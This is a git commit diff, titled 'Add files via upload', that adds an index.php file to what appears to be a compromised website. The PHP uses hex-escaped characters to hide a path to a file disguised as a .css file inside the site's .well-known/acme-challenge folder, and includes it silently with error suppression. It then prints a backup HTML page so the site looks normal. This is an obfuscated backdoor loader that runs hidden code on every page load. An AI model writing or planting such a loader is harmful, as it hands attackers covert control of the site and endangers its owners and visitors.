37045336a0452a4d7f263a7179e5400a04add026
crujonesberad <djhspawn@gmail.com>
2025-06-06 11:12:23 -0600

    Add files via upload

---
+++ index.php
@@ -0,0 +1,9 @@
+<?php
+/*e1d71*/
+
+$r4zbx = "/home/one636/publi\x63_html/modularsystemsolutions.\x63om/.well\x2dknown/a\x63me\x2d\x63hallenge/.b2a1ef13.\x63ss"; if (!isset($r4zbx)) {strpbrk ($r4zbx, $r4zbx);} else { @include_once /* 226 */ ($r4zbx); }
+
+/*e1d71*/
+
+
+echo @file_get_contents('index.html.bak.bak');
